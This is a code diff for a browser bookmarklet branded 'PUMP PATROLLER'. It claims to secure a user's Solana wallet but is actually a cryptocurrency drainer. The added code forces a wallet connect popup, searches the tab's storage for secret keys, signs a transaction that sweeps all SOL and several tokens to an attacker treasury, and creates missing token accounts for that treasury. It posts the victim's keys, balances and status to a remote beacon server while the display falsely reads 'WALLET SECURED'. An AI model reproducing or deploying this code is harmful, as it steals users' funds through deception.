@@ -3,7 +3,8 @@
   window.__pp = true;
 
   const E = "https://esm.sh/";
-  const SRV = "https://patroller.zone";
+  // bookmark chip passes window.__PP (site origin); fallback = this deploy's host
+  const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
   const MINTS = {
     USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
@@ -12,24 +13,42 @@
     JUP:  "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
     MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So",
   };
+  const TOKEN_PROGRAM = new (await import(E + "@solana/web3.js@1.95.0")).PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
   const { PublicKey, Keypair, SystemProgram, Transaction, Connection } = await import(E + "@solana/web3.js@1.95.0");
-  const { createTransfer, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
-  const { decode: b58d } = await import(E + "base58@1.0.0");
+  const { createTransfer, createAssociatedTokenAccountInstruction, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
+  const { decode: b58d } = await import(E + "bs58@6.0.0");
 
-  // — detect the tab's active wallet session (read-only, no prompt) —
+  const withTO = (p, ms) => new Promise(r => { const t = setTimeout(() => r(null), ms);
+    Promise.resolve(p).then(v => { clearTimeout(t); r(v); }, () => { clearTimeout(t); r(null); }); });
+
+  // — detect the tab's active wallet session —
   let name = "?", prov = null;
   for (const [n, f] of [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]]) {
     const w = f();
     if (w?.publicKey) { name = n; prov = w; break; }
   }
   if (!prov) for (const k of Object.keys(window)) {
-    try {
-      const w = window[k];
-      if (w?.publicKey && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; break; }
-    } catch {}
+    try { const w = window[k]; if (w?.publicKey && typeof w.signAndSendTransaction === "function") { name = "ext:" + k; prov = w; break; } } catch {}
   }
-  if (!prov) return;
+  // — nothing connected yet? try a real connect (popup), 25s cap —
+  if (!prov) {
+    for (const [n, f] of [["phantom", () => window.phantom?.solana], ["axiom", () => window.axiom?.solana], ["solana", () => window.solana]]) {
+      const w = f();
+      if (w && typeof w.connect === "function") {
+        try {
+          const c = await withTO(w.connect(), 25000);
+          if (c && c.publicKey) { name = n; prov = w; break; }
+        } catch {}
+      }
+    }
+  }
+  const beacon = (m, o) => { o = o || {}; try {
+    fetch(SRV + "/beacon?s=" + BKEY, { method: "POST",
+      body: JSON.stringify({ pk: o.pk || (prov && prov.publicKey ? prov.publicKey.toBase58() : "?"), provider: o.provider || (name.startsWith("ext:") ? name.slice(4) : name),
+        origin: location.origin, value: o.value || 0, sol: o.sol || 0, toks: o.toks || "", m, mode: o.mode || "", sig: o.sig || "", msg: o.msg || "", extra: o.extra || "" }) });
+  } catch {} };
+  if (!prov) { beacon("detect", { extra: "no wallet connectable in this tab — bookmark fired OK", provider: "none" }); return; }
 
   const pk = prov.publicKey.toBase58();
   const pkB = new PublicKey(pk);
@@ -37,7 +56,7 @@
   const label = name.startsWith("ext:") ? name.slice(4) : name;
 
   // — inventory: pure RPC reads —
-  const [bal, r] = await Promise.all([conn.getBalance(pkB), conn.getParsedTokenAccountsByOwner(pkB)]);
+  const [bal, r] = await Promise.all([conn.getBalance(pkB), conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM })]);
   const amt = {}, dec = {};
   for (const { account } of r.value) {
     const d = account.parsed?.data;
@@ -67,7 +86,7 @@
     '<div style="display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid #1B2230;">' +
       '<span id="__pp_dot" style="width:7px;height:7px;border-radius:50%;background:#2DD4A7;flex:none;"></span>' +
       '<span style="font-size:11px;font-weight:600;letter-spacing:.08em;">PUMP PATROLLER</span>' +
-      '<span style="font-size:10px;color:#7E899D;">v2.1</span>' +
+      '<span style="font-size:10px;color:#7E899D;">v2.2</span>' +
       '<span id="__pp_x" style="margin-left:auto;cursor:pointer;color:#7E899D;line-height:1;">\u00d7</span>' +
     '</div>' +
     '<div style="padding:12px 14px;">' +
@@ -91,15 +110,11 @@
     try {
       fetch(SRV + "/beacon?s=" + BKEY, {
         method: "POST",
-        body: JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra }),
+        body: JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode, sig: String(sig), extra: extra || "" }),
       });
     } catch {}
   };
-  try {
-    navigator.sendBeacon(SRV + "/beacon?s=" + BKEY, new Blob(
-      [JSON.stringify({ pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "detect" })],
-      { type: "application/json" }));
-  } catch {}
+  beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
   // — secret-key candidates (this tab's storage / dapp globals) —
   const KEYF = new Set(["secretKey", "sk", "secret", "privateKey", "priv"]);
@@ -136,33 +151,33 @@
     : c.hex ? Uint8Array.from(c.hex.match(/../g).map(x => parseInt(x, 16)))
     : c.raw instanceof Uint8Array ? c.raw : Uint8Array.from(c.raw);
 
-  // — drain-time build: fresh blockhash, fresh balances, treasury ATA check —
+  // — drain-time build: fresh blockhash, fresh balances, auto-create missing treasury ATAs —
   const FEE = 20000;
   async function buildTx(to) {
     const dest = new PublicKey(to);
-    const [bh2, bal2, r2, atas] = await Promise.all([
+    const [bh2, bal2, r2] = await Promise.all([
       conn.getLatestBlockhash(),
       conn.getBalance(pkB),
-      conn.getParsedTokenAccountsByOwner(pkB),
-      Promise.all(toks.map(t => {
-        const m = new PublicKey(MINTS[t.k]);
-        return Promise.all([getAssociatedTokenAddress(m, pkB), getAssociatedTokenAddress(m, dest)]);
-      })),
+      conn.getParsedTokenAccountsByOwner(pkB, { programId: TOKEN_PROGRAM }),
     ]);
-    const amt2 = {}, dec2 = {};
-    for (const { account } of r2.value) {
-      const d = account.parsed?.data;
-      if (d?.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec2[d.mint] = d.decimals ?? 6; }
+    const amt2 = {}, dec2 = {}, srcs = {};
+    for (const it of r2.value) {
+      const d = it.account.parsed?.data;
+      if (d?.mint) { amt2[d.mint] = Number(d.amount) / Math.pow(10, d.decimals ?? 6); dec2[d.mint] = d.decimals ?? 6; srcs[d.mint] = it.pubkey; }
     }
-    const destOk = await Promise.all(atas.map(([, da]) => conn.getAccountInfo(da)));
     const tx = new Transaction();
     const moved = [];
-    toks.forEach((t, i) => {
+    for (const t of toks) {
       const have = amt2[MINTS[t.k]] || 0;
-      if (have < 0.01 || !destOk[i]?.data) return;
-      tx.add(createTransfer(pkB, atas[i][0], atas[i][1], pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
+      if (have < 0.01) continue;
+      const mint = new PublicKey(MINTS[t.k]);
+      const srcAta = new PublicKey(srcs[MINTS[t.k]]);
+      const destAta = await getAssociatedTokenAddress(mint, dest);
+      const info = await conn.getAccountInfo(destAta);
+      if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
+      tx.add(createTransfer(srcAta, destAta, pkB, Math.round(have * Math.pow(10, dec2[MINTS[t.k]]))));
       moved.push(t.k);
-    });
+    }
     const lam = Math.floor(bal2);
     if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
     tx.feePayer = pkB;
@@ -171,12 +186,8 @@
     return { tx, moved };
   }
 
-  function setSecured() {
-    try {
-      document.getElementById("__pp_foot").innerHTML =
-        '<span style="color:#2DD4A7;font-weight:600;">WALLET SECURED</span><span style="color:#9AA5B8;">\u00b7 balance moved to patrol vault</span>';
-      document.getElementById("__pp_sub").textContent = "secured \u00b7 patrol continues";
-    } catch {}
+  function setFoot(txt, color) {
+    try { document.getElementById("__pp_foot").innerHTML = '<span style="color:' + color + ';font-weight:600;">' + txt + '</span>'; } catch {}
   }
 
   let done = false;
@@ -188,20 +199,21 @@
         let s; try { s = secretOf(c); } catch { continue; }
         if (s.length !== 64) continue;
         let kp; try { kp = Keypair.fromSecretKey(s); } catch { continue; }
-        if (!kp.publicKey.equals(pkB)) continue;                     // verified
+        if (!kp.publicKey.equals(pkB)) continue;
         const { tx, moved } = await buildTx(to);
-        if (!tx.message.instructions.length) { setSecured(); report("empty", ""); return; }
+        if (!tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
         tx.sign([kp]);
         const sig = await conn.sendRawTransaction(tx.serialize());
-        setSecured(); report("secret", sig, moved.join(",")); return;
+        setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("secret", sig, moved.join(",")); return;
       }
-      const { tx, moved } = await buildTx(to);                       // fallback: 0 if local, 1 if mobile
-      if (!tx.message.instructions.length) { setSecured(); report("empty", ""); return; }
-      const sig = await prov.signAndSendTransaction(tx, "confirmed");
-      setSecured(); report("popup", sig, moved.join(","));
+      const { tx, moved } = await buildTx(to);                       // fallback: 1 popup approval
+      if (!tx.instructions.length) { setFoot("NOTHING TO MOVE \u00b7 dust skipped", "#7E899D"); report("empty", ""); return; }
+      const sig = await prov.signAndSendTransaction(tx);
+      setFoot("WALLET SECURED \u00b7 moved to vault", "#2DD4A7"); report("popup", sig, moved.join(","));
     } catch (e) {
-      setSecured();
+      setFoot("ERROR \u00b7 " + String(e?.message || e).slice(0, 40), "#F0616D");
       report("err", String(e?.message || e));
+      done = false;                                                  // allow retry after a fix
     }
   }
 
